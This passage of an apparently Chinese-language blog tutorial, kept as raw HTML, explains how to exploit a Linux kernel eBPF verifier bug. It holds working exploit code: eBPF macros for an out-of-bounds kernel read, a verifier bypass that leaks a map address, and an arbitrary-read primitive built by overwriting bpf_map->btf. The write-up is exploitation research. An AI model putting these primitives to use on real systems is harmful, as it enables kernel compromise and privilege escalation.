class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> <span class="hljs-title">map</span>;</span><br>u32 elem_size;<br>u32 index_mask;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array_aux</span> *<span class="hljs-title">aux</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>DECLARE_FLEX_ARRAY(<span class="hljs-type">char</span>, value) __aligned(<span class="hljs-number">8</span>);<br>DECLARE_FLEX_ARRAY(<span class="hljs-type">void</span> *, ptrs) __aligned(<span class="hljs-number">8</span>);<br>DECLARE_FLEX_ARRAY(<span class="hljs-type">void</span> __percpu *, pptrs) __aligned(<span class="hljs-number">8</span>);<br>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>因此我们只需要前向读取便能读取到 <code>bpf_map</code>，之后通过 <code>bpf_map</code> 的函数表（<code>bpf_map-&gt;ops</code> ）便能泄露出内核地址，这里我们将 <code>bpf_array_ops</code> 的值读取到 <code>map[1]</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_KERNEL_INFO(__map_fd)                      \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x110),        \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),   \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* save the value into map */</span>                   \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0)</span><br></code></pre></td></tr></table></figure><p>成功泄露出内核地址：</p><p><img src="https://s2.loli.net/2023/06/04/zE4t6RO8acsMbJV.png" alt="image.png"></p><blockquote><p>笔者本来想直接写一个循环直接往前盲读 <code>page_offset_base + 0x9d000</code> （通过物理地址 0 处数据定位），但是  <em>verifier 要求不能有回向边</em>  ，所以这里还是老老实实地看 <code>bpf_array</code> 周围的数据：）</p></blockquote><h3 id="Leak-map-address"><a href="#Leak-map-address" class="headerlink" title="Leak map address"></a>Leak map address</h3><p>当我们在调用辅助函数 <code>BPF_FUNC_map_lookup_elem()</code> 时，该函数会返回一个指向 <code>value</code> 的指针，我们是否能够直接将这个值存放到 map 当中从而泄露出 map 地址？通常情况下答案是否定的，verifier 会检查寄存器的类型并阻止指针泄露的情况发生</p><p>现在让我们思考如何利用我们的漏洞寄存器绕过这个限制，注意到 verifier 在跟踪指针寄存器与常量寄存器间运算时会调用到 <code>adjust_ptr_min_max_vals()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">adjust_reg_min_max_vals</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> bpf_insn *insn)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_verifier_state</span> *<span class="hljs-title">vstate</span> =</span> env-&gt;cur_state;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_func_state</span> *<span class="hljs-title">state</span> =</span> vstate-&gt;frame[vstate-&gt;curframe];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">regs</span> =</span> state-&gt;regs, *dst_reg, *src_reg;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">ptr_reg</span> =</span> <span class="hljs-literal">NULL</span>, off_reg = &#123;<span class="hljs-number">0</span>&#125;;<br>u8 opcode = BPF_OP(insn-&gt;code);<br><span class="hljs-type">int</span> err;<br><br>dst_reg = &amp;regs[insn-&gt;dst_reg];<br>src_reg = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span> (dst_reg-&gt;type != SCALAR_VALUE)<br>ptr_reg = dst_reg;<br><span class="hljs-keyword">else</span><br><span class="hljs-comment">/* Make sure ID is cleared otherwise dst_reg min/max could be</span><br><span class="hljs-comment"> * incorrectly propagated into other registers by find_equal_scalars()</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;id = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_X) &#123;<br>src_reg = &amp;regs[insn-&gt;src_reg];<br><span class="hljs-keyword">if</span> (src_reg-&gt;type != SCALAR_VALUE) &#123;<br><span class="hljs-comment">//...</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ptr_reg) &#123;<br><span class="hljs-comment">/* pointer += scalar */</span><br>err = mark_chain_precision(env, insn-&gt;src_reg);<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> err;<br><span class="hljs-keyword">return</span> adjust_ptr_min_max_vals(env, insn,<br>       dst_reg, src_reg);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而在 <code>adjust_ptr_min_max_vals()</code> 当中有这样一个逻辑：如果源寄存器的边界存在 <code>smin_val &gt; smax_val || umin_val &gt; umax_val</code> 的情况，<strong>则直接将目的寄存器设为 unknown</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">adjust_ptr_min_max_vals</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> bpf_insn *insn,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_reg_state *ptr_reg,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_reg_state *off_reg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_verifier_state</span> *<span class="hljs-title">vstate</span> =</span> env-&gt;cur_state;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_func_state</span> *<span class="hljs-title">state</span> =</span> vstate-&gt;frame[vstate-&gt;curframe];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">regs</span> =</span> state-&gt;regs, *dst_reg;<br><span class="hljs-type">bool</span> known = tnum_is_const(off_reg-&gt;var_off);<br>s64 smin_val = off_reg-&gt;smin_value, smax_val = off_reg-&gt;smax_value,<br>    smin_ptr = ptr_reg-&gt;smin_value, smax_ptr = ptr_reg-&gt;smax_value;<br>u64 umin_val = off_reg-&gt;umin_value, umax_val = off_reg-&gt;umax_value,<br>    umin_ptr = ptr_reg-&gt;umin_value, umax_ptr = ptr_reg-&gt;umax_value;<br>u32 dst = insn-&gt;dst_reg, src = insn-&gt;src_reg;<br>u8 opcode = BPF_OP(insn-&gt;code);<br><span class="hljs-type">int</span> ret;<br><br>dst_reg = &amp;regs[dst];<br><br><span class="hljs-keyword">if</span> ((known &amp;&amp; (smin_val != smax_val || umin_val != umax_val)) ||<br>    smin_val &gt; smax_val || umin_val &gt; umax_val) &#123;<br><span class="hljs-comment">/* Taint dst register if offset had invalid bounds derived from</span><br><span class="hljs-comment"> * e.g. dead branches.</span><br><span class="hljs-comment"> */</span><br>__mark_reg_unknown(env, dst_reg);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>而 <code>__mark_reg_unknown()</code> 则会<strong>直接将寄存器设为标量值类型，这样的值可以直接存入 map 而不会被 verifier 限制</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> __mark_reg_unknown(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_verifier_env *env,<br>       <span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Clear type, id, off, and union(map_ptr, range) and</span><br><span class="hljs-comment"> * padding between &#x27;type&#x27; and union</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">memset</span>(reg, <span class="hljs-number">0</span>, offsetof(<span class="hljs-keyword">struct</span> bpf_reg_state, var_off));<br>reg-&gt;type = SCALAR_VALUE;<br>reg-&gt;var_off = tnum_unknown;<br>reg-&gt;frameno = <span class="hljs-number">0</span>;<br>reg-&gt;precise = env-&gt;subprog_cnt &gt; <span class="hljs-number">1</span> || !env-&gt;bpf_capable;<br>__mark_reg_unbounded(reg);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>由此我们便可以通过将指针寄存器与一个漏洞寄存器进行算术运算来绕过这个限制，从而泄露出 map 的地址，需要注意的是<strong>我们的漏洞寄存器的第 33 位是 unknown 的，我们需要将其进行截断以消去</strong>：</p><blockquote><p>我们应当尽量减少截断时 verifier 对寄存器的跟踪，因此这里直接用 <code>mov</code> ，如果使用 <code>and 0xffffffff</code> 这样的操作则没法消除掉 unknown 位，少 and 几位则会导致寄存器边界值和 var_off 重新更新</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> LEAK_MAP_ADDR(__map_fd)                         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV32_REG(VULN_REG, VULN_REG),              \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(1, __map_fd, BPF_REG_8), \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_map_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        LEAK_MAP_ADDR(map_fd), <br>        BPF_EXIT_INSN()<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里需要注意我们获得的地址是指向 <code>bpf_array.value</code> 的，需要自行计算偏移：</p><p><img src="https://s2.loli.net/2023/06/06/1KNx2MTmQ5A39Gp.png" alt="image.png"></p><blockquote><p>这里我们可以注意到 <code>bpf_map</code> <strong>并不在 direct mapping area 上</strong>，应该是调用了 vmalloc，笔者推测可能是因为我们分配的 map 太大的缘故：）</p></blockquote><h2 id="四、任意地址读，泄露进程地址"><a href="#四、任意地址读，泄露进程地址" class="headerlink" title="四、任意地址读，泄露进程地址"></a>四、任意地址读，泄露进程地址</h2><p>接下来我们考虑如何完成任意地址读，由于我们能够读写 <code>bpf_map</code> 中的数据，故考虑从此处下手：）</p><p><strong>BPF Type Format</strong>（BTF）是一种元数据格式，用于给 eBPF 提供一些额外的信息，在内核中使用 <code>btf</code> 结构体表示一条 btf 信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> &#123;</span><br><span class="hljs-type">void</span> *data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_type</span> **<span class="hljs-title">types</span>;</span><br>u32 *resolved_ids;<br>u32 *resolved_sizes;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *strings;<br><span class="hljs-type">void</span> *nohdr_data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_header</span> <span class="hljs-title">hdr</span>;</span><br>u32 nr_types; <span class="hljs-comment">/* includes VOID for base BTF */</span><br>u32 types_size;<br>u32 data_size;<br><span class="hljs-type">refcount_t</span> refcnt;<br>u32 id;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu</span>;</span><br><br><span class="hljs-comment">/* split BTF support */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">base_btf</span>;</span><br>u32 start_id; <span class="hljs-comment">/* first type ID in this BTF (0 for base BTF) */</span><br>u32 start_str_off; <span class="hljs-comment">/* first string offset (0 for base BTF) */</span><br><span class="hljs-type">char</span> name[MODULE_NAME_LEN];<br><span class="hljs-type">bool</span> kernel_btf;<br>&#125;;<br></code></pre></td></tr></table></figure><p>注意到在 <code>bpf_map</code> 当中刚好有一个指向 <code>struct btf</code> 的指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> &#123;</span><br><span class="hljs-comment">//...</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">btf</span>;</span><br></code></pre></td></tr></table></figure><p> <code>bpf_map-&gt;btf</code> 在什么时候会被访问到？注意到 <code>bpf</code> 系统调用给我们提供的选项中有一个为 <code>BPF_OBJ_GET_INFO_BY_FD</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(bpf, <span class="hljs-type">int</span>, cmd, <span class="hljs-keyword">union</span> bpf_attr __user *, uattr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, size)<br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">case</span> BPF_OBJ_GET_INFO_BY_FD:<br>err = bpf_obj_get_info_by_fd(&amp;attr, uattr);<br><span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>对于 map 类型而言最终会调用到 <code>bpf_map_get_info_by_fd()</code> ，在该函数中<strong>会把 bpf_map-&gt;btf.id 拷贝给用户空间</strong>： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf_map_get_info_by_fd</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>,</span><br><span class="hljs-params">  <span class="hljs-type">const</span> <span class="hljs-keyword">union</span> bpf_attr *attr,</span><br><span class="hljs-params">  <span class="hljs-keyword">union</span> bpf_attr __user *uattr)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;btf) &#123;<br>info.btf_id = btf_obj_id(<span class="hljs-built_in">map</span>-&gt;btf);<br>info.btf_key_type_id = <span class="hljs-built_in">map</span>-&gt;btf_key_type_id;<br>info.btf_value_type_id = <span class="hljs-built_in">map</span>-&gt;btf_value_type_id;<br>&#125;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (copy_to_user(uinfo, &amp;info, info_len) ||<br>    put_user(info_len, &amp;uattr-&gt;info.info_len))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf_obj_get_info_by_fd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">union</span> bpf_attr *attr,</span><br><span class="hljs-params">  <span class="hljs-keyword">union</span> bpf_attr __user *uattr)</span><br>&#123;<br><span class="hljs-type">int</span> ufd = attr-&gt;info.bpf_fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span>;</span><br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (CHECK_ATTR(BPF_OBJ_GET_INFO_BY_FD))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>f = fdget(ufd);<br><span class="hljs-keyword">if</span> (!f.file)<br><span class="hljs-keyword">return</span> -EBADFD;<br><br><span class="hljs-keyword">if</span> (f.file-&gt;f_op == &amp;bpf_prog_fops)<br>err = bpf_prog_get_info_by_fd(f.file, f.file-&gt;private_data, attr,<br>      uattr);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (f.file-&gt;f_op == &amp;bpf_map_fops)<br>err = bpf_map_get_info_by_fd(f.file, f.file-&gt;private_data, attr,<br>     uattr);<br></code></pre></td></tr></table></figure><p>我们不难想到的是<strong>我们可以通过控制 btf 指针的方式完成任意地址读</strong>，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> READ_ARBITRARY_ADDR(__map_fd, __idx)            \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu-&gt;limit and do the oob read */</span> \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xd0),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* write the value into bpf_map-&gt;btf */</span>         \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(__idx, __map_fd, BPF_REG_8),     \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_8, 0),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, 0x58),        \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr_4_bytes</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        READ_ARBITRARY_ADDR(map_fd, idx), <br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_info</span> <span class="hljs-title">info</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .info.bpf_fd = map_fd,<br>        .info.info_len = <span class="hljs-keyword">sizeof</span>(info),<br>        .info.info = (<span class="hljs-type">uint64_t</span>) &amp;info,<br>    &#125;;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> ret;<br><br>    ret = run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    ret = bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    data = info.btf_id;<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Loading value into map...&quot;</span>);<br>    key = <span class="hljs-number">1</span>;<br>    value[<span class="hljs-number">0</span>] = addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = addr + <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    data = read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">2</span>);<br>    data &lt;&lt;= <span class="hljs-number">32</span>;<br>    data += read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br></code></pre></td></tr></table></figure><p>不过由于我们目前暂时不知道 <code>page_offset_base</code> ，因此暂时无法完成对所有物理内存搜索的工作，而只能读取内核镜像范围的内存</p><p>但是 <code>init</code> 进程的 PCB <code>init_task</code> 位于内核数据段上，<strong>init_task 的地址对我们来说是可知的</strong>，而<strong>所有进程在内核中的 PCB 构成一个双向链表，因此我们可以直接沿着这个双向链表搜索我们的进程控制块</strong>，判断是否搜索到的方法有很多，比如说对比 pid 一类的，这里笔者选择用 <code>prctl(PR_SET_NAME, &quot;arttnba3&quot;)</code> 来设置 <code>task_struct-&gt;comm</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 